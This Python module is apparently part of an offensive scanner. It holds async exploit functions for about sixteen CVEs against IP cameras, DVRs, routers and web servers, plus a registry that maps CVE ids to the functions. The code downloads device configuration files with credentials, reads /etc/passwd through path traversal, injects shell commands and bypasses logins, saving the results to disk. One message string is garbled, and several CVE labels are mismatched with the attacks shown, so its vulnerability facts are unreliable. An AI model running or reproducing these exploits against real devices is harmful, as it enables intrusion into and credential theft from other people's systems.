import aiohttp
import logging
from rich.console import Console
import asyncio

console = Console()


async def exploit_cve_2017_7921(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/System/configurationFile?auth=YWRtaW46MTEK"
    console.print(f"[yellow]CVE-2017-7921 trying: {exploit_url}[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.read()
                if b"<userName>" in content and b"<password>" in content:
                    console.print("[bold green]VULNERABILITY SUCCESSFUL! Device configuration file downloaded.[/bold green]")
                    filename = f"CVE-2017-7921_{target_ip}.conf"
                    with open(filename, 'wb') as f:
                        f.write(content)
                    return f"Successful. The configuration file was saved as '{filename}'. Check the contents."
                else:
                    return "Failed. The server returned 200 OK but the expected content was not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2017-7921 exploit error: {e}")
        return f"Error: {e}"



#hikvision exploit
async def exploit_cve_2021_36260(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/SDK/webLanguage"
    payload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(id)</language>"
    headers = {'Content-Type': 'application/xml'}
    console.print(f"[yellow]CVE-2021-36260 trying: {exploit_url} (Command Execution)[/yellow]")
    try:
        
        async with session.put(exploit_url, data=payload, headers=headers, timeout=8, ssl=False) as response:
            
            if response.status == 200:
                 return "[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL![/bold green] The server gave a 200 OK response. This means that the command is most likely running, but this exploit does not provide a direct output due to its nature."
            else:
                return f"Failed. Server returned {response.status} code."
    except asyncio.TimeoutError:
        return "[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL![/bold green] The server did not respond (timed out), which is usually expected behavior when the command is executed."
    except Exception as e:
        logging.error(f"CVE-2021-36260 exploit error: {e}")
        return f"Error: {e}"





async def exploit_cve_2022_28173(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/arcsoft/static/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
    console.print(f"[yellow]CVE-2022-28173 trying: {exploit_url} (File Reading)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.text()
                if "root:" in content:
                    console.print("[bold green]THE VULNERABILITY IS SUCCESSFUL! /etc/passwd file was read.[/bold green]")
                    filename = f"CVE-2022-28173_{target_ip}_passwd.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(content)
                    return f"Succesful. File '{filename}' saved."
                else:
                    return "Failed. The server returned 200 OK but the expected content ('root:') was not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2022-28173 exploit error: {e}")
        return f"Error: {e}"


#dahua exploit
async def exploit_cve_2021_33044(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/SDK/../../../../../../../../../../../../etc/passwd"
    console.print(f"[yellow]CVE-2021-33044 trying: {exploit_url} (Path Traversal)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.text()
                if "root:" in content or "admin:" in content:
                    console.print("[bold green]THE VULNERABILITY IS SUCCESSFUL! /etc/passwd file was read.[/bold green]")
                    filename = f"CVE-2021-33044_{target_ip}_passwd.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(content)
                    return f"Succesful. File '{filename}' saved."
                else:
                    return "Failed. The server returned 200 OK but the expected content was not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2021-33044 exploit error: {e}")
        return f"Error: {e}"

async def exploit_cve_2021_33045(target_ip: str, port: int, session: aiohttp.ClientSession):
    console.print(f"[yellow]CVE-2021-33045 checking (Information).[/yellow]")
    return "This vulnerability (CVE-2021-33045) is related to accessing log files without authentication. There is no reliable method for an automated exploit because log file names are unpredictablevulnerability (CVE-2021-33045) is related to accessing log files without authentication. There is no reliable method for anmended."



#tp-link exploit
async def exploit_cve_2023_50387(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/"
    payload = {
        "method": "do",
        "cnid": "e9829a732ef158a1",
        "params": {
            "system": {
                "reboot": "; id"
            },
            "login": {
                "username": "",
                "password": ""
            }
        }
    }
    console.print(f"[yellow]CVE-2023-50387 trying: {exploit_url} (Command Execution)[/yellow]")
    try:
        async with session.post(exploit_url, json=payload, timeout=10, ssl=False) as response:
            if response.status == 200:
                 return "[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL![/bold green] The server returned a 200 OK response. This means the command most likely worked, but does not provide any direct output."
            else:
                 return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2023-50387 exploit error: {e}")
        return f"Error: {e}"


async def exploit_cve_2022_4499(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/../../../../../../../../../../../../../../"
    console.print(f"[yellow]CVE-2022-4499 trying: {exploit_url} (Path Listing)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                content = await response.text()
                if "etc" in content and "bin" in content and "usr" in content:
                    console.print("[bold green]THE VULNERABILITY IS PROBABLY SUCCESSFUL! The root directory is listed.[/bold green]")
                    filename = f"CVE-2022-4499_{target_ip}_rootdir.txt"
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(content)
                    return f"Successful. The directory list was saved as '{filename}'."
                else:
                    return "Failed. The server returned 200 OK but the expected directories were not found."
            else:
                return f"Failed. The server returned {response.status} code."
    except Exception as e:
        logging.error(f"CVE-2022-4499 exploit error: {e}")
        return f"Error: {e}"




#dvr auth bypass
async def exploit_cve_2018_9995(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/device.rsp?opt=user&cmd=list"
    headers = {'Cookie': 'uid=admin'}
    console.print(f"[yellow]CVE-2018-9995 trying: {exploit_url} (Auth Bypass)[/yellow]")
    try:
        async with session.get(exploit_url, headers=headers, timeout=10, ssl=False) as response:
            if response.status == 200 and "password" in await response.text():
                content = await response.text()
                filename = f"CVE-2018-9995_{target_ip}_users.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(content)
                console.print("[bold green]SUCCESS! User list retrieved.[/bold green]")
                return f"Saved as {filename}"
            else:
                return f"Failed. Server returned {response.status}"
    except Exception as e:
        logging.error(f"CVE-2018-9995 error: {e}")
        return f"Error: {e}"


#dahua rce
async def exploit_cve_2017_8225(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/current_config/passwd"
    console.print(f"[yellow]CVE-2017-8225 trying: {exploit_url} (Config Leak)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200 and "root" in await response.text():
                content = await response.text()
                filename = f"CVE-2017-8225_{target_ip}_passwd.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(content)
                console.print("[bold green]SUCCESS! Config leaked.[/bold green]")
                return f"Saved as {filename}"
            else:
                return f"Failed. Status code: {response.status}"
    except Exception as e:
        logging.error(f"CVE-2017-8225 error: {e}")
        return f"Error: {e}"


#file disclosure
async def exploit_cve_2018_10660(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/../../../../etc/passwd"
    console.print(f"[yellow]CVE-2018-10660 trying: {exploit_url} (File Disclosure)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            text = await response.text()
            if "root:" in text:
                filename = f"CVE-2018-10660_{target_ip}_passwd.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text)
                console.print("[bold green]SUCCESS! /etc/passwd retrieved.[/bold green]")
                return f"Saved as {filename}"
            else:
                return "Failed. No expected content."
    except Exception as e:
        logging.error(f"CVE-2018-10660 error: {e}")
        return f"Error: {e}"


#panasonic onvif auth bypass
async def exploit_cve_2016_5674(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/onvif/device_service"
    console.print(f"[yellow]CVE-2016-5674 trying: {exploit_url} (ONVIF Auth Bypass)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200:
                return "[bold green]Possible bypass! Server responded without auth.[/bold green]"
            else:
                return f"Failed. Status code: {response.status}"
    except Exception as e:
        logging.error(f"CVE-2016-5674 error: {e}")
        return f"Error: {e}"


#tp-link archer AX21 rce
async def exploit_cve_2023_1389(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/cgi-bin/luci"
    headers = {"User-Agent": "() { :;}; echo; /bin/bash -c 'id'"}
    console.print(f"[yellow]CVE-2023-1389 trying: {exploit_url} (RCE)[/yellow]")
    try:
        async with session.get(exploit_url, headers=headers, timeout=10, ssl=False) as response:
            if "uid=" in await response.text():
                console.print("[bold green]RCE SUCCESSFUL![/bold green]")
                return await response.text()
            else:
                return "Failed. No command output."
    except Exception as e:
        logging.error(f"CVE-2023-1389 error: {e}")
        return f"Error: {e}"


#Spring4Shell rce
async def exploit_cve_2022_22965(target_ip: str, port: int, session: aiohttp.ClientSession):
    url = f"http://{target_ip}:{port}/"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{cmd}..."
    console.print(f"[yellow]CVE-2022-22965 attempting Spring4Shell payload injection.[/yellow]")
    try:
        async with session.post(url, data=payload, headers=headers, timeout=10, ssl=False) as response:
            return f"Payload sent. Status: {response.status}"
    except Exception as e:
        logging.error(f"CVE-2022-22965 error: {e}")
        return f"Error: {e}"


#auth bypass in routers
async def exploit_cve_2021_20090(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/images/..%2finfo.html"
    console.print(f"[yellow]CVE-2021-20090 trying: {exploit_url} (Auth Bypass)[/yellow]")
    try:
        async with session.get(exploit_url, timeout=10, ssl=False) as response:
            if response.status == 200 and "Firmware" in await response.text():
                console.print("[bold green]Bypass successful! Admin info leaked.[/bold green]")
                return await response.text()
            else:
                return "Failed. No expected content."
    except Exception as e:
        logging.error(f"CVE-2021-20090 error: {e}")
        return f"Error: {e}"


#tenda rce
async def exploit_cve_2022_27255(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"http://{target_ip}:{port}/goform/setUsbUnload"
    payload = "op=;id"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    console.print(f"[yellow]CVE-2022-27255 trying: {exploit_url} (RCE)[/yellow]")
    try:
        async with session.post(exploit_url, data=payload, headers=headers, timeout=10, ssl=False) as response:
            text = await response.text()
            if "uid=" in text:
                console.print("[bold green]RCE SUCCESSFUL![/bold green]")
                return text
            else:
                return "Failed. No output."
    except Exception as e:
        logging.error(f"CVE-2022-27255 error: {e}")
        return f"Error: {e}"
    

async def exploit_cve_2024_3400(target_ip: str, port: int, session: aiohttp.ClientSession):
    exploit_url = f"https://{target_ip}:{port}/ssl-vpn/portal"
    payload = {
        "user": "admin",
        "passwd": "admin",
        "inputStr": "{{7*7}}"  
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    console.print(f"[yellow]CVE-2024-3400 trying {exploit_url} (SSTI Template Injection)[/yellow]")
    try:
        async with session.post(exploit_url, data=payload, headers=headers, timeout=10, ssl=False) as response:
            text = await response.text()
            if "49" in text:
                console.print("[bold green]VULNERABLE! Template output matched.[/bold green]")
                return "Payload succeeded. Check server for command execution."
            else:
                return "Failed or not vulnerable."
    except Exception as e:
        logging.error(f"CVE-2024-3400 error: {e}")
        return f"Error: {e}"



EXPLOIT_REGISTRY = {
    "CVE-2017-7921": exploit_cve_2017_7921,
    "CVE-2021-36260": exploit_cve_2021_36260,
    "CVE-2022-28173": exploit_cve_2022_28173,
    "CVE-2021-33044": exploit_cve_2021_33044,
    "CVE-2021-33045": exploit_cve_2021_33045, 
    "CVE-2023-50387": exploit_cve_2023_50387,
    "CVE-2022-4499": exploit_cve_2022_4499,
    "CVE-2018-9995": exploit_cve_2018_9995,
    "CVE-2017-8225": exploit_cve_2017_8225,
    "CVE-2018-10660": exploit_cve_2018_10660,
    "CVE-2016-5674": exploit_cve_2016_5674,
    "CVE-2023-1389": exploit_cve_2023_1389,
    "CVE-2022-22965": exploit_cve_2022_22965,
    "CVE-2021-20090": exploit_cve_2021_20090,
    "CVE-2022-27255": exploit_cve_2022_27255,
    "CVE-2024-3400": exploit_cve_2024_3400,
    
}
